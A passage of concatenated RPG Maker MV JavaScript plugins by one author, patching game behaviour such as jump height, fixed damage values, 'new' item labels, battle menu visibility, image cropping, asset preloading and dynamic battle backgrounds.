 * Game_Character._jumpCountSubMore = a positive number
 *
 *
 *
 * reset: set to undefined
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Game_CharacterBase.prototype;
k='jump';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	{ const d=         Number(this._jumpCountDelta);    if(d) this._jumpPeak=(this._jumpCount+=d)/2; }
	{ const t=Math.max(Number(this._jumpCountSetTo),1); if(t) this._jumpPeak=(this._jumpCount =t)/2; }
	return rtv;
}).ori=r;
k='updateJump';
r=p[k]; (p[k]=function f(){
	{ const sm=Math.max(Number(this._jumpCountSubMore+1),0)-1; if(sm) this._jumpCount-=sm; }
	if(!(this._jumpCount>=1)) this._jumpCount=1; // built-in use "=== 0"
	return f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 角色、怪物設定每次受到的傷害為固定值。仍可受防禦與元素屬性設定影響倍率。恢復類攻擊(.isRecover())不受影響。設定負值會變成受到傷害時增加現有HP。
 * @author agold404
 * @help in note: <fixedDamaged:a_number_value>
 * 
 * example:
 * <fixedDamaged:1>
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Game_Action.prototype;
k='fixedDamaged_targetValue';
r=p[k]; (p[k]=function f(trgt){
	const trgtd=trgt && trgt.getData();
	return trgtd && Number(trgtd.meta.fixedDamaged);
}).ori=r;
k='fixedDamaged_usingValue';
r=p[k]; (p[k]=function f(trgt){
	if(!this.isRecover()) return this.fixedDamaged_targetValue(trgt);
}).ori=r;
p[k].tbl=new Set([3,4]);
k='evalDamageFormula';
r=p[k]; (p[k]=function f(trgt){
	const val=this.fixedDamaged_usingValue(trgt);
	return isNaN(val)?f.ori.apply(this,arguments):val;
}).ori=r;
k='applyVariance';
r=p[k]; (p[k]=function f(dmg,v_,trgt){
	return isNaN(this.fixedDamaged_usingValue(trgt))?f.ori.apply(this,arguments):dmg;
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc styled text on item
 * @author agold404
 * @help "\STYLEDTEXT." as prefix
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

if(0) new cfc(Bitmap.prototype).add('drawText',function f(text, x, y, W, lh, align){
	const isTarget=f.tbl[0]===text;
	let fontFaceOri;
	if(isTarget){
		fontFaceOri=this._makeFontNameText.tbl;
		this._makeFontNameText.tbl=f.tbl[1];
	}
	const rtv=f.ori.apply(this,arguments);
	if(isTarget) this._makeFontNameText.tbl=fontFaceOri;
	return rtv;
},[
'…',
'標楷體',
]);

{ const p=Window_Base.prototype;
k='textWidth';
r=p[k]; (p[k]=function f(txt){
	//return f.ori.apply(this,arguments); // debug
	if(!this._tbl_txtW) this._tbl_txtW={};
	if(!this._tbl_txtWUnitThresholdRate) this._tbl_txtWUnitThresholdRate= Math.pow(2,-4)+Math.pow(2,-5)+Math.pow(2,-8)+Math.pow(2,-9)+Math.pow(2,-12) +1; // ~= 1.1
	if(!this._tbl_txtWUnits) this._tbl_txtWUnits=[];
	let unit=this._tbl_txtWUnits[this.contents.fontSize]; if(!unit) unit=this._tbl_txtWUnits[this.contents.fontSize]={};
if(1){
	if(!unit._one) unit._one=f.ori.call(this,'金')/2;
	//if(txt==='…') return unit._one*2;
	if(txt&&txt.length===1){
		if(unit[txt]>=0) return unit[txt];
		let w=f.ori.apply(this,arguments);
		const r=w/unit._one;
		if(1<r&&r<this._tbl_txtWUnitThresholdRate) w=unit._one;
		return unit[txt]=w;
	}
}else{
	if(!unit._two) unit._two=f.ori.call(this,'ag');
	//if(txt==='…') return unit._two;
	if(txt&&txt.length===1){
		if(unit[txt]>=0) return unit[txt];
		let w=f.ori.apply(this,arguments);
		const r=unit._two/w;
		if(1<r&&r<this._tbl_txtWUnitThresholdRate) w=unit._two;
		return unit[txt]=w;
	}
}
	return this._tbl_txtW[txt]>=0?this._tbl_txtW[txt]:f.ori.apply(this,arguments);
}).ori=r;
k='drawText';
r=p[k]; (p[k]=function f(text, x, y, maxWidth, align){
	let rtv;
	if(text && text.constructor===String && text.slice(0,f.tbl[0].length)===f.tbl[0]){
		const txtStat={},c=this.constructor;
		if(this.contents&&this.contents._context){
			let t=f.tbl[1].get(c); if(!t){
				const custom=f.tbl[2].get(c);
				if(custom) t=custom.call(this,f.tbl);
				else f.tbl[1].set(c,t=new c(0,0,Graphics.boxWidth,this.lineHeight()<<2));
			}
			t.drawTextEx(text.slice(f.tbl[0].length), 0, 0, undefined, undefined, txtStat);
			const wsrc=~~(txtStat.maxX+1),hsrc=txtStat.height;
			this.contents._context.drawImage(t.contents._context.canvas,0,0,wsrc,hsrc,x,y,rtv=Math.min(wsrc,maxWidth),hsrc);
			t.contents._context.clearRect(0,0,wsrc,hsrc);
			if(!this._tbl_txtW) this._tbl_txtW={};
			this._tbl_txtW[text]=rtv;
		}else rtv=this.drawTextEx(text.slice(f.tbl[0].length), x, y, undefined, undefined, txtStat);
	}else rtv=f.ori.apply(this,arguments);
	return rtv;
}).ori=r;
p[k].tbl=[
"\\STYLEDTEXT.",
new Map(),
new Map([
[Window_ShopBuy,function f(tbl){
	const rtv=new Window_ShopBuy(0,0,Graphics.boxWidth,[]);
	rtv.width=this.width; rtv.createContents();
	return rtv;
}],
])
];
}

})();


﻿"use strict";
/*:
 * @plugindesc 新道具標new
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

t=[
'newThingFirst',
'_newThingFirst',
"新道具置頂",
];

{ const p=Game_Party.prototype;
k='_getGainLoggers';
r=p[k]; (p[k]=function(){
	let rtv=$gameTemp._gainLoggers;
	if(!rtv) rtv=$gameTemp._gainLoggers=new Map();
	return rtv;
}).ori=r;
k='gainLogger_clear_equips';
r=p[k]; (p[k]=function(){
	const m=this._getGainLoggers();
	m.delete(this._weapons);
	m.delete(this._armors);
}).ori=r;
k='gainLogger_clear';
r=p[k]; (p[k]=function(){
	const m=this._getGainLoggers();
	m.delete(this._items);
	m.delete(this._weapons);
	m.delete(this._armors);
}).ori=r;
k='gainLogger_update';
r=p[k]; (p[k]=function(container,item,amount){ if(!item) return;
	const m=this._getGainLoggers();
	let L=m.get(container); if(!L) m.set(container,L={});
	if(!L[item.id]) L[item.id]=0;
	if(!((L[item.id]+=amount)>0)) L[item.id]=0;
}).ori=r;
k='gainLogger_isNew';
r=p[k]; (p[k]=function(container,item){ if(!item) return;
	const m=this._getGainLoggers();
	let L=m.get(container); if(!L) m.set(container,L={});
	return L[item.id]>0;
}).ori=r;
k='gainItem';
r=p[k]; (p[k]=function(item, amount, includeEquip){
	const container=this.itemContainer(item);
	if(container){
		const lastNumber = this.numItems(item);
		const newNumber = lastNumber + amount;
		container[item.id] = newNumber.clamp(0, this.maxItems(item));
		if(container[item.id] === 0){
			delete container[item.id];
		}
		if(includeEquip && newNumber < 0){
			this.discardMembersEquip(item, -newNumber);
		}
		$gameMap.requestRefresh();
	}
	return container;
}).ori=r;
k='gainItem';
r=p[k]; (p[k]=function f(item, amount, includeEquip){
	const rtv=f.ori.apply(this,arguments),sm=SceneManager;
	const sc=sm&&sm._scene;
	if(rtv && item && amount && sc && sc.constructor!==Scene_Equip) this.gainLogger_update(rtv,item,amount);
	return rtv;
}).ori=r;
}

new cfc(ConfigManager).add('applyData',function f(config){
	const rtv=f.ori.apply(this,arguments);
	this[f.tbl[0]]=this.readFlag(config,f.tbl[0]);
	return rtv;
},t).add('makeData',function f(){
	const rtv=f.ori.apply(this,arguments);
	rtv[f.tbl[0]]=this[f.tbl[0]]|0;
	return rtv;
},t);

new cfc(Window_Options.prototype).add('makeCommandList',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.addCommand(f.tbl[2], f.tbl[0]);
	return rtv;
},t);

new cfc(Window_ItemList.prototype).add('makeItemList',function f(){
	let rtv=f.ori.apply(this,arguments);
	if(this[f.tbl[1]]){
		if(!(this._data.length>=this._onTopEndIdx)) this._onTopEndIdx=this._data.length;
		const arr0=this._data.slice(0,this._onTopEndIdx),arr1=[],arr=this._data;
		for(let x=this._onTopEndIdx,xs=arr.length;x!==xs;++x) (arr[x]&&$gameParty.gainLogger_isNew($gameParty.itemContainer(arr[x]),arr[x])?arr0:arr1).push(arr[x]);
		this._onTopEndIdx=arr0.length;
		for(let x=0;x!==arr1.length;++x) arr0.push(arr1[x]);
		if(rtv===this._data) rtv=arr0;
		this._data=arr0;
	}
	return rtv;
},t);

{ const p=Window_Base.prototype;
k='drawItemName';
r=p[k]; (p[k]=function f(){
	if(!f.tbl) f.tbl=new Set([ Scene_Equip||0, Scene_Item||0, ]);
	const sm=SceneManager;
	const sc=sm&&sm._scene;
	this._gainLogger_new=f.tbl.has(sc&&sc.constructor);
	const rtv=f.ori.apply(this,arguments);
	this._gainLogger_new=undefined;
	return rtv;
}).ori=r;
k='drawIcon';
r=p[k]; (p[k]=function f(iconIndex, x, y, item){
	const rtv=f.ori.apply(this,arguments);
	if(item && this._gainLogger_new){ this._gainLogger_new=false; const pt=$gameParty; if(pt.gainLogger_isNew(pt.itemContainer(item),item)){
		this.drawText("new",x,y,Window_Base._iconWidth,'center');
	} }
	return rtv;
}).ori=r;
}

new cfc(Scene_Equip.prototype).add('create',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._itemWindow[f.tbl[1]]=ConfigManager[f.tbl[0]];
	return rtv;
},t).add('terminate',function f(){
	const rtv=f.ori.apply(this,arguments),sm=SceneManager;
	const nc=sm&&sm._nextScene;
	if(nc && nc.constructor===Scene_Map){
		$gameTemp.gainLogger_shouldClear_equips=false;
		$gameParty && $gameParty.gainLogger_clear_equips();
	}else $gameTemp.gainLogger_shouldClear_equips=true;
	return rtv;
});

new cfc(Scene_Item.prototype).add('create',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._itemWindow[f.tbl[1]]=ConfigManager[f.tbl[0]];
	return rtv;
},t).add('terminate',function f(){
	const rtv=f.ori.apply(this,arguments),sm=SceneManager;
	const nc=sm&&sm._nextScene;
	if(nc && nc.constructor===Scene_Map){
		$gameTemp.gainLogger_shouldClear=false;
		$gameParty && $gameParty.gainLogger_clear();
	}else $gameTemp.gainLogger_shouldClear=true;
	return rtv;
});

{ const p=Scene_Menu.prototype;
k='terminate';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments),sm=SceneManager;
	const nc=sm&&sm._nextScene;
	if(nc && nc.constructor===Scene_Map){
		if($gameTemp.gainLogger_shouldClear){
			$gameTemp.gainLogger_shouldClear_equips=
			$gameTemp.gainLogger_shouldClear=false;
			$gameParty && $gameParty.gainLogger_clear();
		}else if($gameTemp.gainLogger_shouldClear_equips){
			$gameTemp.gainLogger_shouldClear_equips=false;
			$gameParty && $gameParty.gainLogger_clear_equips();
		}
	}
	return rtv;
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 戰鬥介面選單文字消失trait
 * @author agold404
 * @help <戰鬥介面選單文字消失>
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t;

const gbb=Game_BattlerBase,kwp='戰鬥介面選單文字消失',kw=kwp+'';
const kwt='TRAIT_'+kw;
const kwget="get_"+kw;
const kwmain="is_"+kw;

if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
gbb.
	addEnum(kwt).
	addEnum('__END__');

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataActors .forEach(f.tbl[0]);
	$dataClasses.forEach(f.tbl[0]);
	$dataWeapons.forEach(f.tbl[0]);
	$dataArmors .forEach(f.tbl[0]);
	$dataStates .forEach(f.tbl[0]);
	$dataEnemies.forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl=[
(dataobj)=>{ if(!dataobj) return;
	const meta=dataobj.meta;
	if(meta[kw]){
		dataobj.traits.push({code:gbb[kwt],dataId:meta[kw],value:0});
	}
},
];
}

{ const p=Game_Battler.prototype;
k=kwget;
r=p[k]; (p[k]=function f(){
	return this.traits(gbb[kwt]);
}).ori=r;
k=kwmain;
r=p[k]; (p[k]=function f(){
	return this[f.tbl[0]]().some(f.tbl[1]);
}).ori=r;
p[k].tbl=[
kwget,
t=>t&&t.dataId===true,
];
}

t=[kwmain,'_'+kwmain];

{ const p=Scene_Battle.prototype;
k='startActorCommandSelection';
r=p[k]; (p[k]=function f(){
	const actr=BattleManager.actor();
	this._statusWindow.select(actr.index());
	this._partyCommandWindow.close();
	this._actorCommandWindow.setup(actr);
	const val = actr && actr[f.tbl[0]]();
	for(let x=0,windows=[this._helpWindow,this._itemWindow,this._skillWindow];x!==windows.length;++x){
		const w=windows[x];
		windows[x][f.tbl[1]]=val;
	}
}).ori=r;
p[k].tbl=t;
}

{ const p=Window_ActorCommand.prototype;
k='setup';
r=p[k]; (p[k]=function f(actor){
	this[f.tbl[1]] = actor && actor[f.tbl[0]]();
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl=t;
}

{ const p=Window_Base.prototype;
k='initialize';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this[f.tbl[1]]=undefined;
	return rtv;
}).ori=r;
p[k].tbl=t;
for(let kv=['drawIcon','drawItemName','drawText','drawTextEx',],ki=0;ki!==kv.length;++ki){
k=kv[ki];
r=p[k]; (p[k]=function f(){
	let edited,ga,ctx;
	if(this.contents && this[f.tbl[1]]){
		this.contents[f.tbl[1]]=edited=true;
		if(ctx=this.contents.context){
			ga=ctx.globalAlpha;
			ctx.globalAlpha=0;
		}
	}
	const rtv=f.ori.apply(this,arguments);
	if(edited){
		this.contents[f.tbl[1]]=undefined;
		if(ga>=0) ctx.globalAlpha=ga;
	}
	return rtv;
}).ori=r;
p[k].tbl=t;
} // for
}

{ const p=Bitmap.prototype;
k='initialize';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this[f.tbl[1]]=undefined;
	return rtv;
}).ori=r;
p[k].tbl=t;
k='drawText';
r=p[k]; (p[k]=function f(){
	if(this[f.tbl[1]]) return;
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl=t;
}

})();


﻿"use strict";
/*:
 * @plugindesc ImageManager.loadBitmap: x,y,w,h|'filename' arg to specify only use from x,y within (width,height)=(w,h) in the image
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=ImageManager;
for(let ki=0,kv=['loadBitmap','reserveBitmap',];ki!==kv.length;++ki){
k=kv[ki];
r=p[k]; (p[k]=function f(){ // folder, filename, 
	if(arguments[1] && arguments[1].constructor===String){
		const idx=arguments[1].indexOf("|");
		if(idx>=0){
			const rg=arguments[1].slice(0,idx).split(',').map(Number);
			if(rg && rg.length===4 && !rg.filter(isNaN).length){
				this._onlyInRange=rg;
				arguments[1]=arguments[1].slice(idx+1);
			}
		}
	}
	const rtv=f.ori.apply(this,arguments);
	this._onlyInRange=undefined;
	return rtv;
}).ori=r;
} // for
k='loadNormalBitmap';
r=p[k]; (p[k]=function f(){ // path, 
	let rtv;
	if(this._onlyInRange){
		const key = this._onlyInRange + "|" + this._generateCacheKey(arguments[0], arguments[1]);
		let bitmap=this._imageCache.get(key);
		if(!bitmap){
			this._imageCache.add(key, bitmap=new Bitmap(1,1));
			const arr=this._onlyInRange;
			const x=arr[0],y=arr[1],w=arr[2],h=arr[3];
			f.ori.apply(this,arguments).addLoadListener(bm=>{
				const c=document.createElement('canvas'); c.width=w; c.height=h;
				const ctx=c.getContext('2d');
				const args=this._parseQs(arguments[0]);
				ctx.globalCompositeOperation='copy';
				ctx.drawImage(bm._canvas,x,y,w,h,0,0,w,h);
				bitmap.resize(w,h);
				bitmap.clear();
				bitmap.bltImage({width:w,height:h,_image:ctx.canvas},0,0,w,h,0,0);
				bitmap._loadingState='loaded';
			});
		}
		rtv=bitmap;
	}else rtv=f.ori.apply(this,arguments);
	return rtv;
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc YEP is slow
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=BattleManager;
k='registerSprite';
r=p[k]; (p[k]=function(btlr,sp){
	let m=this._registeredSprites; if(!m) m=this._registeredSprites=new Map();
	m.set(btlr,sp);
}).ori=r;
k='getSprite';
r=p[k]; (p[k]=function(btlr){
	let m=this._registeredSprites; if(!m) m=this._registeredSprites=new Map();
	return m.get(btlr);
}).ori=r;
p.clearRegisteredSprites=function(){
	const m=this._registeredSprites; if(m) m.clear();
};
}

{ const p=Scene_Battle.prototype;
k='terminate';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	BattleManager.clearRegisteredSprites();
	return rtv;
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc limit what item id can be displayed on Window_EventItem
 * @author agold404
 * @help provide 3 APIs
 * $gameSystem.EventItemList_setWhite( array_of_item_ids ); // for white list, ONLY these item will be displayed
 * $gameSystem.EventItemList_setBlack( array_of_item_ids ); // for black list, these item will NOT be displayed
 * $gameSystem.EventItemList_clear(); // clear setting to default. (probably is displaying all item if no other related plugins)
 * 
 * 'array' will not be deep copied. handle it by yourself.
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Game_System.prototype;
k='_EventItemList_container';
r=p[k]; (p[k]=function(arr){
	let rtv=this._eventItemList;
	if(!rtv) rtv=this._eventItemList={isWhite:false,list:arr||[],};
	return rtv;
}).ori=r;
k='_EventItemList_setList';
r=p[k]; (p[k]=function(arr,isWhite){
	const c=this._EventItemList_container(arr);
	c.isWhite=isWhite;
	c.list=arr;
}).ori=r;
k='EventItemList_setWhite';
r=p[k]; (p[k]=function(arr){
	this._EventItemList_setList(arr,true);
}).ori=r;
k='EventItemList_setBlack';
r=p[k]; (p[k]=function(arr){
	this._EventItemList_setList(arr,false);
}).ori=r;
k='EventItemList_clear';
r=p[k]; (p[k]=function(){
	this._eventItemList=undefined;
}).ori=r;
k='EventItemList_isPassed';
r=p[k]; (p[k]=function(item){
	const c=this._EventItemList_container(); if(!c) return true;
	if(!c.list._set) c.list._set=new Set(c.list);
	return c.list._set.has(item&&item.id)^!c.isWhite;
}).ori=r;
}

{ const p=Window_EventItem.prototype;
k='includes';
r=p[k]; (p[k]=function f(item){
	return $gameSystem.EventItemList_isPassed(item) && f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 吸血吸魔比率，依技能/道具設定
 * @author agold404
 * @help 技能/道具 <drainRate:a_number>
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	// order: editor menu
	$dataSkills.forEach(f.forEach);
	$dataItems.forEach(f.forEach);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].forEach=dataobj=>{ if(!dataobj) return;
	const meta=dataobj.meta;
	if(!meta.drainRate || isNaN(dataobj.drainRate=meta.drainRate-0)) dataobj.drainRate=1;
};
}

{ const p=Game_Action.prototype;
for(let ki=0,kv=['gainDrainedHp','gainDrainedMp',];ki!==kv.length;++ki){
k=kv[ki];
r=p[k]; (p[k]=function f(){ // val,
	const item=this.item();
	if(item) arguments[0]*=item.drainRate;
	const rtv=f.ori.apply(this,arguments);
	if(rtv && arguments[0]<0){
		if(0<rtv.hp) rtv.onDamage(-arguments[0]);
		else if(rtv.isDead()) rtv.performCollapse();
	}
	return rtv;
}).ori=r;
}
}

})();


﻿"use strict";
/*:
 * @plugindesc reduce A1 tiles refresh
 * @author agold404
 * @help <canvasAniCnt:_number_greater_than_0_>
 * <aniCnt:_number_greater_than_0_>
 * use canvasAniCnt else aniCnt else default
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Tilemap.prototype;
k='setData';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	let tmp;
	if($dataMap && this._mapData===$dataMap.data && $dataMap.meta){
		if(this.constructor===Tilemap) tmp=~~Number($dataMap.meta.canvasAniCnt);
		if(!(0<tmp)) tmp=~~Number($dataMap.meta.aniCnt);
	}
	if(!(0<tmp)) tmp=~~30; // original setting
	this._animationCountThreshold=tmp;
	return rtv;
}).ori=r;
k='update';
r=p[k]; (p[k]=function f(){
	this.animationCount++;
	this.animationFrame=Math.floor(this.animationCount/this._animationCountThreshold);
	this.children.forEach(f.tbl[0]);
	for(let i=0;i!==this.bitmaps.length;++i){
		if(this.bitmaps[i]){
			this.bitmaps[i].touch();
		}
	}
}).ori=r;
p[k].tbl=[
c=>c.update&&c.update(),
];
}

})();


﻿"use strict";
/*:
 * @plugindesc 指定圖片正中心於某事件中心上(以圖片為準)
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Game_Picture.prototype;
k='fixedOnEvent_set';
r=p[k]; (p[k]=function f(evtid){
	this._fixedOnEvent=evtid;
}).ori=r;
k='fixedOnEvent_unset';
r=p[k]; (p[k]=function f(){
	this._fixedOnEvent=undefined;
}).ori=r;
k='fixedOnEvent_get';
r=p[k]; (p[k]=function f(){
	return this._fixedOnEvent;
}).ori=r;
k='fixedOnEvent_getevtsp';
r=p[k]; (p[k]=function f(){
	const evt=$gameMap && $gameMap._events[this._fixedOnEvent];
	if(evt){
		const sc=SceneManager._scene;
		const m=sc&&sc._chr2sp;
		return m && m.get(evt);
	}
}).ori=r;
k='x';
r=p[k]; (p[k]=function(){
	const sp=this.fixedOnEvent_getevtsp();
	return sp?sp.x:this._x;
}).ori=r;
k='y';
r=p[k]; (p[k]=function(){
	const sp=this.fixedOnEvent_getevtsp();
	return sp?sp.y:this._y;
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc MOG回合條，使用atb from YEP
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

if((typeof Battle_Hud)!=='undefined' && Battle_Hud.prototype.refresh_at_meter_flow)(()=>{ let k,r,t;

{ const p=Scene_Base.prototype;
k='createBattleHudScreenLayout';
r=p[k]; (p[k]=function f(){
	const bm=ImageManager.loadBHud("ATB_Meter");
	const sp=this._globalRoundMeter=new Sprite(bm);
	const barH=sp._barHeight=5; // by img
	sp.x=f.tbl[1][0];
	sp.y=f.tbl[1][1];
	sp.alpha=f.tbl[2];
	this._hudField.addChild(sp);
	bm.addLoadListener(f.tbl[0].bind(sp,barH));
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl=[
t=function f(barHeight,bm){
	const loc=f.tbl[1];
	const w=Math.max(Graphics.boxWidth-loc[2]-loc[0],0)||0,h=Math.max(loc[3]-loc[1],0)||0;
	this.scale.x=w/bm.width;
	this.scale.y=h/barHeight;
},
[69,3,77,14], // left:px  top:px  right:px  height:px
0.75,
];
t.tbl=p[k].tbl;
}

{ const p=Scene_Battle.prototype;
k='updateGlobalRoundMeter';
r=p[k]; (p[k]=function f(val_curr,val_max){
	const sp=this._globalRoundMeter; if(!sp) return f.ori && f.ori.apply(this,arguments);
	const bw=sp.bitmap.width,bh=sp.bitmap.height;
	const w=bw,h=sp._barHeight||0;
	const rate=Math.max(Math.min(val_curr / val_max,1),0)||0;
	const type=1; // 2nd bar
	
	sp.setFrame(0,type * h, bw*rate, h);
	if(this._screen_layout) sp.alpha=this._screen_layout.alpha;
	
	return sp;
}).ori=r;
k='updateGlobalRoundMeter_sync';
r=p[k]; (p[k]=function f(){
	const sp=this._globalRoundMeter; if(!sp) return f.ori && f.ori.apply(this,arguments);
	
	if(this._screen_layout) sp.alpha=this._screen_layout.alpha;
	
	return sp;
}).ori=r;
k='update';
r=p[k]; (p[k]=function f(val_curr,val_max){
	{ const bm=BattleManager; if(bm.isATB()) this.updateGlobalRoundMeter(bm._atbTicks+bm.tickRate(),bm._atbFullTurn); }
	const rtv=f.ori.apply(this,arguments);
	this.updateGlobalRoundMeter_sync();
	return rtv;
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 更換地圖時預讀動畫圖片 ; 自行指定預讀資料
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

window.$dataMap=null;

t=[
function f(cmd){ if(cmd && cmd.code===212){ const ani=$dataAnimations[cmd.parameters[1]]; if(ani){
	for(let x=1;x!==3;++x){ const p="animation"+x,n=p+"Name"; if(ani[n]){
		// ImageManager.loadAnimation(ani[n],ani[p+"Hue"]);
		this.ani.add(ani[n]);
	} }
	ani.timings.forEach(f.tbl[4],this);
} } },
function f(pg){ pg.list.forEach(f.tbl[0],this); },
function f(evtd){ evtd && evtd.pages.forEach(f.tbl[1],this); },
aniName=>ImageManager.loadAnimation(aniName,0),
function f(timing){ timing.se && this.se.add(timing.se.name); },
seName=>new WebAudio(AudioManager._path+'se/'+seName+AudioManager.audioFileExt(),true,true),
note=>DataManager.sendLoadReq_byNote(note),
]; t.forEach(f=>f.tbl=f.ori=t);

new cfc(DataManager).add('onLoad_after_map',function f(obj){
	const rtv=f.ori && f.ori.apply(this,arguments),sm=SceneManager,sc=sm._scene;
	if(sc && ( (sc._transfer&&sm.isScene_map())||f.tbl[0].has(sm._previousClass) )) this.onLoad_map_preload(obj);
	return rtv;
},[
new Set([Scene_Load,Scene_Options,]),
]).add('onLoad_map_preload',function f(obj){
	const collect={ani:new Set(),se:new Set(),};
	obj.events.forEach(f.tbl[2],collect);
	collect.ani.forEach(f.tbl[3]);
	collect.se.forEach(f.tbl[5]);
	f.tbl[6](obj.note);
},t);

})();


﻿"use strict";
/*:
 * @plugindesc 設定讓事件走出地圖
 * @author agold404
 * @help 事件note區
 * <outOfMap>
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Game_CharacterBase.prototype;
k='canPassOutOfMap';
r=p[k]; (p[k]=function f(){
	return false;
}).ori=r;
k='canPass';
r=p[k]; (p[k]=function(x, y, d) {
	var x2 = $gameMap.roundXWithDirection(x, d);
	var y2 = $gameMap.roundYWithDirection(y, d);
	if(!this.canPassOutOfMap() && !$gameMap.isValid(x2, y2)){
		return false;
	}
	if (this.isThrough() || this.isDebugThrough()) {
		return true;
	}
	if(this.canPassOutOfMap()?$gameMap.isValid(x2, y2)&&!this.isMapPassable(x, y, d):!this.isMapPassable(x, y, d)){
		return false;
	}
	if (this.isCollidedWithCharacters(x2, y2)) {
		return false;
	}
	return true;
}).ori=r;
}

{ const p=Game_Event.prototype;
k='initialize';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this._outOfMap=this.event().meta.outOfMap;
	return rtv;
}).ori=r;
k='canPassOutOfMap';
r=p[k]; (p[k]=function f(){
	return this._outOfMap;
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 戰鬥中背景開心換
 * @author agold404
 * @help as following:
 * 
 * [to change backgruond (add new or replace)]:
 * SceneManager._scene._spriteset.dynamicBattleback_change( bg_id_string fade_in_and_change_speed_frames bg_path_from_game_root is_loop_h? is_loop_v? final_alpha final_speed_x final_speed_y )
 * 
 * With same bg_id_string meaning replace, other bg will fade to aplha=0 in fade_in_and_change_speed_frames.
 * If it's new, speed will be final_speed from the start
 * do not use white space. using %20 in the path instead
 * 
 * 
 * [to clear (fade out) specific]:
 * SceneManager._scene._spriteset.dynamicBattleback_clear( bg_id_string fade_out_frames )
 * 
 * 
 * [to clear all]:
 * SceneManager._scene._spriteset.dynamicBattleback_restore( fade_out_frames )
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const c='Sprite_dynamicBattlebackRoot';

{ const a=window[c]=function(){
	this.initialize();
};
const p=a.prototype=Object.create(Sprite.prototype);
k='initialize';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this._cleared=false;
	this._cells=[];
	this._speedX=undefined;
	this._speedY=undefined;
	this._finalScaleX=1;
	this._finalScaleY=1;
	this._finalShiftX=0;
	this._finalShiftY=0;
	this.alpha=0;
	return rtv;
}).ori=r;
(t=p.setup=function f(bitmap,changeFrame,final_alpha,loopH,loopV,final_speedX,final_speedY,final_sclx,final_scly,final_shx,final_shy){
	if(bitmap && this._bmpRef && bitmap!==this._bmpRef && (!this._cleared||this.alpha)){
		// this already has bitmap. change it (smoothly).
		const p=this.parent,sp=new window[c](),idx=p.getChildIndex(this);
		p._map.set(sp._key=this._key,sp);
		this._key=f;
		f.apply(sp,arguments);
		p.addChildAt(sp,idx+1);
		bitmap=undefined;
		final_alpha=0;
		this._cleared=true;
	}else{
		this._loopH=loopH===undefined?this._loopH:loopH;
		this._loopV=loopV===undefined?this._loopV:loopV;
		{
			const fsx=this._finalSpeedX=final_speedX===undefined?this._finalSpeedX:final_speedX; if(isNaN(this._speedX)) this._speedX=fsx; if(isNaN(this._speedX)) this._finalSpeedX=this._speedX=0;
			const fsy=this._finalSpeedY=final_speedY===undefined?this._finalSpeedY:final_speedY; if(isNaN(this._speedY)) this._speedY=fsy; if(isNaN(this._speedY)) this._finalSpeedY=this._speedY=0;
		}
		{
			const fsx=this._finalShiftX=final_shx===undefined?this._finalShiftX:final_shx; if(isNaN(this._shx))          this._shx=fsx;    if(isNaN(this._shx))    this._finalShiftX=this._shx=0;
			const fsy=this._finalShiftY=final_shy===undefined?this._finalShiftY:final_shy; if(isNaN(this._shy))          this._shy=fsy;    if(isNaN(this._shy))    this._finalShiftY=this._shy=0;
		}
		{
